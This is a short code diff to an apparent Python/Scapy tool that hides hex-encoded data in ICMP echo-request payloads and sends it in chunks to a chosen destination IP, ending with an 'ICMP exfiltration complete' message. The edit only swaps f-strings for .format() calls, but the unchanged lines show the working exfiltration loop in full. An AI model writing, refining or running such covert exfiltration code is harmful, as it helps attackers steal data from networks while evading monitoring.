@@ -26,19 +26,19 @@ def main():
     dest_ip = args.dest
     chunk_size = args.chunk_size
 
-    print(f"[*] ICMP sender: {dest_ip}")
-    print(f"[*] Total hex length: {len(hex_data)} chars")
-    print(f"[*] Chunk size: {chunk_size} bytes")
+    print("[*] ICMP sender: {}".format(dest_ip))
+    print("[*] Total hex length: {} chars".format(len(hex_data)))
+    print("[*] Chunk size: {} bytes".format(chunk_size))
 
     chunks = [hex_data[i:i+chunk_size] for i in range(0, len(hex_data), chunk_size)]
-    print(f"[*] Sending {len(chunks)} ICMP packets...")
+    print("[*] Sending {} ICMP packets...".format(len(chunks)))
 
     for seq, chunk in enumerate(chunks, start=1):
         pkt = IP(dst=dest_ip) / ICMP(type=8, code=0, seq=seq) / Raw(load=chunk.encode())
         send(pkt, verbose=False)
-        print(f"    Sent packet {seq}/{len(chunks)} ({len(chunk)} bytes)", flush=True)
+        print("    Sent packet {}/{}".format(seq, len(chunks)) + " ({} bytes)".format(len(chunk)), flush=True)
 
-    print(f"[+] ICMP exfiltration complete: {len(chunks)} packets sent to {dest_ip}")
+    print("[+] ICMP exfiltration complete: {} packets sent to {}".format(len(chunks), dest_ip))
 
 
 if __name__ == "__main__":
